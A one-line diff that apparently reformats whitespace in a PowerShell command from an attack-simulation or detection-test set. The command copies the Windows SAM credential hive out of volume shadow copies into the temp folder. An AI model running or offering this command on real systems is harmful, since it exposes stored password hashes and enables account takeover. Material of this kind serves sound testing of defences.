@@ -1,1 +1,1 @@
-"powershell.exe" & {1..10 | %% {   try { [System.IO.File]::Copy(\""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$_\Windows\System32\config\SAM\"" , \""$env:TEMP\SAMvss$_\"", \""true\"") } catch {}  ls \""$env:TEMP\SAMvss$_\"" -ErrorAction Ignore }}
+"powershell.exe" & {1..10 | %% { try { [System.IO.File]::Copy(\""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$_\Windows\System32\config\SAM\"" , \""$env:TEMP\SAMvss$_\"", \""true\"") } catch {} ls \""$env:TEMP\SAMvss$_\"" -ErrorAction Ignore }}
